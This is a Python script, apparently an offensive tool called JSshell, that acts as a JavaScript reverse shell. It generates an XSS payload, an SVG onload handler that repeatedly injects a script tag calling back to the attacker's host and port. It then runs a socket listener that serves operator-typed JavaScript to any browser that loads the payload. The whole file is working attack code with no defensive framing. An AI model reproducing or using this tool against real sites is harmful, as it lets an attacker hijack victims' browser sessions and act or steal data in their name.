#!/usr/bin/env python3
import socket
import os
import sys
from requests import get
import argparse

white = '\033[1;97m'
red = '\033[1;31m'
white = '\033[1;m'
blue = '\033[0;34m'
if os.name == 'nt':
    white = red = white = blue = ''
    
if sys.version_info < (3, 0):
    input = raw_input

banner = '''%s    __              
  |(_  _ |_  _  |  |
\_|__)_> | |(/_ |  |
                      v1.0
''' % red
hp = '''JSshell using javascript code as shell commands. Also supports some commands:
help                  This help
exit, quit            Exit the JS shell'''


parser = argparse.ArgumentParser(description='JSshell 1.0: javascript reverse shell')
parser.add_argument('-p', help='local port number (default: 4848)', dest='port', default=4848)
parser.add_argument('-s', help='local sorce address', dest='host', default='')
parser.add_argument('-g', help='generate JS reverse shell payload', dest='gene', action='store_true')
parser.add_argument('-c', help='command to execute after got shell', dest='command', default='')
parser.add_argument('-w', help='timeout for shell connection', dest='secs', default=0)

args = parser.parse_args()

host = format(args.host)
if not len(host):
    host = get('https://api.ipify.org').text
try:
    port = int(format(args.port))
except:
    print('Invalid port %s' % port)
gene = args.gene
cmd = format(args.command)
secs = int(format(args.secs))
payload = '<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},1212)>\n' % (host, port)


print(banner)
if gene == True:
    print('%sPayload:' % white)
    print(payload)
    
print('%sListening on [any] %s for incoming JS shell ...' % (white, port))
        

def shell():
    form = b'''HTTP/1.1 200 OK
Content-Type: application/javascript
Connection: close

'''
    i = 0
    history = ''
    while 1:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('0.0.0.0', port))
        if secs != 0:
            s.settimeout(secs)
        s.listen(0)
        try:
            c, a = s.accept()
            data = c.recv(1024).decode()
            buffer = input('%s$ %s' % (blue, white))
            if buffer == 'exit' or buffer == 'quit':
                c.close()
                break
            elif buffer == 'help':
                print(hp)
                
                
            c.send(form + buffer.encode())
            c.close()
        except KeyboardInterrupt:
            print('\n^C')
            s.close()
            break
        except Exception as msg:
            print(msg)
            s.close()
            break
        

        
def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind(('0.0.0.0', port))
    except socket.error as msg:
        print("Can't grab 0.0.0.0:%s with bind: Try a bigger local port number" % port)
    s.listen(0)
    
    try:
        c, addr = s.accept()
        resp = c.recv(1024).decode()
    except:
        s.close()
        main()
        
    if 'Accept' in resp and 'HTTP' in resp:
        print ('Got JS shell from [%s] port %s to %s %s' % (addr[0], addr[1], socket.gethostname(), port))
        if len(cmd):
            c.send(cmd.encode())
            print('%s$ %s%s' % (blue, white, cmd))
        c.close()
        s.close()
        shell()
    else:
        s.close()
        main()


main()
